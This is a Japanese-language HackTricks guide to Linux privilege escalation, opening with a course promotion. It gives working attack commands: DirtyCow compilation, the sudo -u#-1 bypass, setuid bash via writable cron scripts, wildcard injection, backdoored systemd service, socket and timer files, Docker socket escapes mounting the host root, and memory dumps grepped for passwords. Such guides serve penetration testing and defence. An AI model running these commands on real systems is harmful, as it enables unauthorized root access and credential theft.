# Linux権限昇格

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## システム情報

### OS情報

OSの知識を得ることから始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし`PATH`変数内の任意のフォルダに**書き込み権限がある場合**、いくつかのライブラリやバイナリをハイジャックすることができるかもしれません：
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### カーネルエクスプロイト

カーネルバージョンを確認し、権限昇格に使用できるエクスプロイトがあるかどうかを確認してください
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
以下のリンクには、脆弱なカーネルリストといくつかの**コンパイル済みエクスプロイト**があります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
他の**コンパイル済みエクスプロイト**を見つけることができるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次の操作を行います:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルの脆弱性を探すのに役立つツールは以下の通りです：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者のシステムで実行、カーネル2.xの脆弱性のみチェック)

常に**Googleでカーネルバージョンを検索**してください。もしかすると、あなたのカーネルバージョンが何かのカーネル脆弱性に記載されているかもしれません。その場合、その脆弱性が有効であることが確実になります。

### CVE-2016-5195 (DirtyCow)

Linux権限昇格 - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に基づいて脆弱な sudo バージョンが表示されます：
```bash
searchsploit sudo
```
```markdown
sudoバージョンが脆弱かどうかは、このgrepを使用して確認できます。
```
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov から
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗

この脆弱性がどのように悪用され得るかの**例**として、**HTBのsmasher2 box**をチェックしてください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### システム列挙の詳細
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR (アドレス空間配置のランダム化)
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Dockerコンテナの内部にいる場合、脱出を試みることができます：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ドライブ

**マウントされているものとマウントされていないもの**を確認し、どこに、なぜマウントされているかを確認します。何もマウントされていない場合は、マウントを試み、プライベート情報をチェックすることができます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

便利なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**を確認してください。これは、カーネルエクスプロイトを使用する必要がある場合に役立ちます。それを使用するマシン（または同様のもの）でコンパイルすることをお勧めします。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱性のあるソフトウェアのインストール

**インストールされているパッケージとサービスのバージョン**を確認してください。たとえば、古いNagiosのバージョンが権限昇格のために悪用される可能性があります…\
疑わしいソフトウェアのバージョンは手動で確認することをお勧めします。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHアクセスがある場合、**openVAS**を使用して、マシン内にインストールされた古くて脆弱なソフトウェアをチェックすることもできます。

{% hint style="info" %}
_これらのコマンドは多くの情報を表示しますが、ほとんどが役に立たないため、OpenVASなどのアプリケーションを使用して、インストールされたソフトウェアバージョンが既知のエクスプロイトに脆弱かどうかをチェックすることをお勧めします。_
{% endhint %}

## プロセス

**実行中のプロセス**を確認し、プロセスが**適切以上の権限を持っていないか**（rootによって実行されているtomcatなど）をチェックします。
```bash
ps aux
ps -ef
top -n 1
```
以下は、[**electron/cef/chromiumデバッガー**が実行されているかどうかを常に確認し、権限昇格に悪用できる可能性があります](electron-cef-chromium-debugger-abuse.md)。**Linpeas**はプロセスのコマンドライン内の`--inspect`パラメータをチェックすることでこれらを検出します。
また、プロセスバイナリに対する**自分の権限を確認してください**。もしかすると、他人のものを上書きできるかもしれません。

### プロセス監視

プロセスを監視するために[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使用できます。これは、頻繁に実行される脆弱なプロセスを特定したり、一連の要件が満たされたときに非常に役立ちます。

### プロセスメモリ

サーバーの一部のサービスは**メモリ内にクリアテキストで資格情報を保存**します。
通常、他のユーザーに属するプロセスのメモリを読むには**root権限**が必要ですので、これは通常、すでにrootであり、さらに多くの資格情報を発見したい場合に役立ちます。
しかし、**通常のユーザーとして、自分が所有するプロセスのメモリを読むことができる**ことを覚えておいてください。

{% hint style="warning" %}
現在のほとんどのマシンでは**デフォルトでptraceが許可されていない**ことに注意してください。これは、特権のないユーザーに属する他のプロセスをダンプすることができないことを意味します。

ファイル _**/proc/sys/kernel/yama/ptrace\_scope**_ はptraceのアクセス可能性を制御します：

* **kernel.yama.ptrace\_scope = 0**: 同じuidを持つすべてのプロセスがデバッグ可能です。これは、ptracingが動作していた古典的な方法です。
* **kernel.yama.ptrace\_scope = 1**: 親プロセスのみがデバッグ可能です。
* **kernel.yama.ptrace\_scope = 2**: 管理者のみがptraceを使用できます。これにはCAP\_SYS\_PTRACE機能が必要です。
* **kernel.yama.ptrace\_scope = 3**: ptraceを使用してプロセスをトレースすることはできません。一度設定すると、ptracingを再度有効にするためには再起動が必要です。
{% endhint %}

#### GDB

FTPサービス（例えば）のメモリにアクセスできる場合、ヒープを取得し、その中の資格情報を検索することができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**mapsはそのプロセスの**仮想アドレス空間内でメモリがどのようにマッピングされているかを示し、各マッピング領域の**権限も表示します**。**mem**疑似ファイルは**プロセスのメモリ自体を公開します**。**maps**ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットを知ります。この情報を使用して、**memファイル内をシークし、読み取り可能なすべての領域をファイルにダンプします**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理的な**メモリにアクセスを提供します。仮想メモリではありません。カーネルの仮想アドレス空間は /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux用ProcDump

ProcDumpは、WindowsのSysinternalsツールスイートの古典的なProcDumpツールをLinuxに再想像したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)で入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、以下のツールを使用できます:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - 手動でroot要件を削除し、自分が所有するプロセスのダンプが可能です
* スクリプト A.5 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (rootが必要です)

### プロセスメモリからの認証情報

#### 手動例

認証プロセスが実行中であることがわかった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプできます（プロセスのメモリをダンプするさまざまな方法を見つけるには、前のセクションを参照してください）し、メモリ内のクレデンシャルを検索します：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は**メモリから平文の資格情報を盗む**ことができ、いくつかの**よく知られたファイル**からも盗むことができます。適切に機能するためにはroot権限が必要です。

| 機能                                               | プロセス名             |
| ------------------------------------------------- | -------------------- |
| GDMパスワード (Kaliデスクトップ, Debianデスクトップ) | gdm-password         |
| Gnomeキーリング (Ubuntuデスクトップ, ArchLinuxデスクトップ) | gnome-keyring-daemon |
| LightDM (Ubuntuデスクトップ)                      | lightdm              |
| VSFTPd (アクティブなFTP接続)                      | vsftpd               |
| Apache2 (アクティブなHTTPベーシック認証セッション)  | apache2              |
| OpenSSH (アクティブなSSHセッション - Sudo使用)     | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cronジョブ

スケジュールされたジョブに脆弱性がないか確認してください。rootによって実行されるスクリプトを利用できるかもしれません（ワイルドカードの脆弱性？rootが使用するファイルを変更できますか？シンボリックリンクを使用しますか？rootが使用するディレクトリに特定のファイルを作成できますか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中で PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(ユーザー "user" が /home/user に対して書き込み権限を持っていることに注意してください)

この crontab の中で root ユーザーがパスを設定せずに何かのコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その時、以下を使用して root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cronがワイルドカード（ワイルドカードインジェクション）を使用したスクリプトを実行する

rootによって実行されるスクリプトがコマンド内に「**\***」を含んでいる場合、予期しないこと（privescのような）を実行するためにこれを利用できます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードがパス** _**/some/path/\***_ **の前にある場合、脆弱ではありません（** _**./\***_ **も同様です）。**

ワイルドカードのさらなる悪用テクニックについては、以下のページを読んでください：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cronスクリプトの上書きとシンボリックリンク

rootによって実行されるcronスクリプトを**変更できる場合**、非常に簡単にシェルを取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
スクリプトがrootによって実行され、**あなたが完全にアクセスできるディレクトリ**を使用している場合、そのフォルダを削除し、**別のフォルダへのシンボリックリンクを作成する**ことで、自分が制御するスクリプトを提供することが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁なcronジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを探すことができます。それを利用して権限を昇格させることができるかもしれません。

例えば、**1分間に0.1秒ごとに監視する**場合、**実行されたコマンドが少ない順に並べ替え**、最も実行されたコマンドを削除するには、次のようにします：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また、** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは開始されるすべてのプロセスを監視し、リストアップします) **を使用することもできます。**

### 見えないcronジョブ

**コメントの後にキャリッジリターンを入れる**ことで（改行文字なしで）、cronジョブを作成することが可能です。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルに書き込みができるかどうかを確認してください。もし書き込みができる場合、サービスが**開始**、**再開始**、または**停止**されたときにバックドアが**実行されるように変更する**ことができます（マシンが再起動されるまで待つ必要があるかもしれません）。\
例えば、**`ExecStart=/tmp/script.sh`** を使って .service ファイル内にバックドアを作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されているバイナリに**書き込み権限がある場合**、それらをバックドアに変更することができます。そうすると、サービスが再実行されたときにバックドアが実行されます。

### systemd PATH - 相対パス

**systemd** が使用している PATH を以下のコマンドで確認できます：
```bash
systemctl show-environment
```
```
もしパスのフォルダに**書き込み**ができることがわかったら、**権限昇格**が可能かもしれません。サービス設定ファイルで使用されている**相対パス**を探す必要があります。例えば:
```
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能なsystemd PATHフォルダ内に**相対パスバイナリと同じ名前の実行可能ファイル**を作成し、サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するように求められたとき、あなたの**バックドアが実行されます**（通常、権限のないユーザーはサービスを開始/停止できませんが、`sudo -l`を使用できるかどうかを確認してください）。

**`man systemd.service`でサービスについてもっと学びましょう。**

## **タイマー**

**タイマー**は、`**.timer**`で終わる名前のsystemdユニットファイルで、`**.service**`ファイルやイベントを制御します。**タイマー**は、カレンダー時間イベントとモノトニック時間イベントの組み込みサポートがあり、非同期に実行できるため、cronの代替として使用できます。

すべてのタイマーを列挙するには：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit（`.service` や `.target` など）の既存のものを実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、ユニットが何であるかを読むことができます：

> このタイマーが経過したときにアクティブにするユニット。引数は ".timer" ではないサフィックスを持つユニット名です。指定されていない場合、この値はタイマーユニットと同じ名前を持つサービスにデフォルト設定されますが、サフィックスは除きます。（上記参照。）アクティブにするユニット名とタイマーユニットのユニット名が、サフィックスを除いて同一であることが推奨されます。

したがって、この権限を悪用するには以下が必要です：

* 書き込み可能なバイナリを**実行している systemd ユニット**（例えば `.service`）を見つける
* 相対パスを**実行している systemd ユニット**を見つけ、**systemd PATH** 上で**書き込み権限**を持っている（その実行可能ファイルを偽装する）

**`man systemd.timer` でタイマーについてさらに学びましょう。**

### **タイマーを有効にする**

タイマーを有効にするには root 権限が必要で、以下を実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
タイマーは、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**アクティブ化**されます。

## ソケット

簡単に言うと、Unixソケット（技術的にはUnixドメインソケット、**UDS**）は、クライアントサーバーアプリケーションフレームワーク内の同じマシンまたは異なるマシン上の二つの異なるプロセス間の**通信を可能にします**。より正確には、標準のUnixディスクリプタファイルを使用してコンピュータ間で通信する方法です。（[こちら](https://www.linux.com/news/what-socket/)から）

ソケットは `.socket` ファイルを使用して設定できます。

`man systemd.socket` でソケットについて**詳しく学びましょう**。このファイル内では、いくつかの興味深いパラメータを設定できます：

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットが**どこでリッスンするかを示します**（AF_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）。
* `Accept`: ブール値を取ります。**true**の場合、各着信接続に対して**サービスインスタンスが生成され**、接続ソケットのみがそれに渡されます。**false**の場合、リッスンしているすべてのソケット自体が**開始されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットが生成されます。この値は、単一のサービスユニットが無条件にすべての着信トラフィックを処理するデータグラムソケットとFIFOでは無視されます。**デフォルトはfalseです**。パフォーマンス上の理由から、`Accept=no`に適した方法でのみ新しいデーモンを書くことを推奨します。
* `ExecStartPre`, `ExecStartPost`: 一つ以上のコマンドラインを取り、それぞれリッスンしている**ソケット**/FIFOが**作成**およびバインドされる**前**または**後**に**実行されます**。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
* `ExecStopPre`, `ExecStopPost`: リッスンしている**ソケット**/FIFOが**閉じられ**および削除される**前**または**後**に**実行される追加の**コマンド**。
* `Service`: **着信トラフィック**に対して**アクティブ化する**サービスユニット名を指定します。この設定はAccept=noのソケットにのみ許可されます。デフォルトでは、ソケットと同じ名前（サフィックスが置き換えられた）のサービスになります。ほとんどの場合、このオプションを使用する必要はありません。

### 書き込み可能な .socket ファイル

書き込み可能な `.socket` ファイルを見つけた場合、`[Socket]` セクションの始めに `ExecStartPre=/home/kali/sys/backdoor` のようなものを**追加**でき、ソケットが作成される前にバックドアが実行されます。したがって、マシンが再起動されるまで**おそらく待つ必要があります**。\
_そのソケットファイルの設定をシステムが使用していない場合、バックドアは実行されないことに注意してください_

### 書き込み可能なソケット

書き込み可能なソケット（_ここで言うのはUnixソケットであり、設定 `.socket` ファイルではありません_）を**特定した場合**、そのソケットと**通信でき**、脆弱性を悪用する可能性があります。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### Raw接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**悪用例:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTPソケット

HTTPリクエストを待ち受けている**ソケット**があるかもしれないことに注意してください（_.socketファイルについて話しているのではなく、unixソケットとして機能するファイルのことです_）。これを確認するには：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
```markdown
ソケットが**HTTPリクエストで応答する**場合、それと**通信**ができ、場合によっては**何らかの脆弱性を悪用**することができます。

### 書き込み可能なDockerソケット

**dockerソケット**は通常`/var/run/docker.sock`にあり、`root`ユーザーと`docker`グループのみが書き込み可能です。\
何らかの理由でそのソケットに対する書き込み権限を**持っている場合**、権限昇格が可能です。\
以下のコマンドを使用して権限を昇格させることができます：
```
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### DockerパッケージなしでソケットからDocker Web APIを使用する

**Dockerソケット**にアクセスできるが、Dockerバイナリを使用できない場合（インストールされていない可能性もあります）、`curl`を使用してWeb APIに直接アクセスできます。

以下のコマンドは、ホストシステムのルートをマウントする**Dockerコンテナを作成し**、新しいDocker内でコマンドを実行するために`socat`を使用する方法の例です。
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
最後のステップは、`socat`を使用してコンテナに接続を開始し、"attach"リクエストを送信することです。
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
以下は、この`socat`接続からコンテナにコマンドを実行する方法です。

### その他

**`docker`グループに属している**ためにdockerソケットに対する書き込み権限を持っている場合、[**権限昇格のためのさらなる方法があります**](interesting-groups-linux-pe/#docker-group)。[**docker APIがポートでリスニングしている場合**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)も、それを侵害する可能性があります。

dockerからの脱出や権限昇格のための乱用についての**さらなる方法**は以下を確認してください:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 権限昇格

**`ctr`** コマンドを使用できることがわかった場合、以下のページを読んでください。**権限昇格のために乱用できる可能性があります**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 権限昇格

**`runc`** コマンドを使用できることがわかった場合、以下のページを読んでください。**権限昇格のために乱用できる可能性があります**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Busは**プロセス間通信（IPC）システム**であり、アプリケーションが互いに通信し、情報を交換し、サービスを要求するためのシンプルでありながら強力なメカニズムを提供します。D-Busは、現代のLinuxシステムのニーズを満たすようにゼロから設計されました。

完全なIPCおよびオブジェクトシステムとして、D-Busにはいくつかの意図された用途があります。まず、D-Busは基本的なアプリケーションIPCを実行し、あるプロセスが別のプロセスにデータを送信できます—**UNIXドメインソケットのステロイド版**と考えてください。次に、D-Busはシステムを通じてイベントやシグナルを送信することを容易にし、システムの異なるコンポーネントが通信し、最終的にはより良く統合されることを可能にします。例えば、Bluetoothデーモンが着信コールシグナルを送信し、音楽プレーヤーがそれをキャッチして、通話が終了するまで音量をミュートすることができます。最後に、D-Busはリモートオブジェクトシステムを実装し、あるアプリケーションが異なるオブジェクトからサービスを要求し、メソッドを呼び出すことができます—**複雑さのないCORBAを考えてください**。（[こちら](https://www.linuxjournal.com/article/7744)から）。

D-Busは**許可/拒否モデル**を使用し、各メッセージ（メソッド呼び出し、シグナル発行など）は、それに一致するすべてのポリシールールの合計に従って**許可または拒否**されることができます。ポリシーの各ルールには、`own`、`send_destination`、または`receive_sender`属性が設定されている必要があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf`のポリシーの一部：
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
したがって、ポリシーがユーザーに**バスとのやり取り**を許可している場合、権限の昇格を悪用できる可能性があります（パスワードのリストアップだけかもしれません？）。

**ポリシー**が特定のユーザーやグループを指定していない場合、それは全員に影響します（`<policy>`）。"default"コンテキストのポリシーは、他のポリシーに影響されない全員に影響します（`<policy context="default"`）。

**D-Bus通信の列挙と悪用の方法をこちらで学びましょう：**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **ネットワーク**

ネットワークを列挙し、マシンの位置を把握することは常に興味深いです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

以前にアクセスする前に対話できなかったマシン上で実行されているネットワークサービスを常に確認してください：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### スニッフィング

トラフィックをスニッフィングできるか確認してください。できれば、いくつかの資格情報を掴むことができるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

**誰**であるか、どのような**権限**を持っているか、システム内にいる**ユーザー**は誰か、ログインできるユーザーは誰か、**root権限**を持っているユーザーは誰かを確認します：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
